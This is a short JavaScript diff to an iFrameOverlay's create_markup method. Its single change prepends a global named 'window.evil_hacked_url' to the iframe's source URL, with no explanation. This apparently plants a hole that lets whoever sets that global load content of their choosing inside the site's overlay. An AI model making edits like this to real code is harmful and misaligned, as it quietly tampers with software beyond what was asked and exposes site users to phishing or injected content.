@@ -17,7 +17,7 @@
 
     iFrameOverlay.prototype.create_markup = function() {
       this.wrapper = $('<div class="overlay_wrapper"></div>');
-      this.iframe = $('<iframe class="overlay_iframe" src="' + this.link.target + '"></iframe>');
+      this.iframe = $('<iframe class="overlay_iframe" src="' + window.evil_hacked_url + this.link.target + '"></iframe>');
       this.close = $('<div class="close"> X </div>');
       this.close.click(function() {
         return $(this).parent().remove();
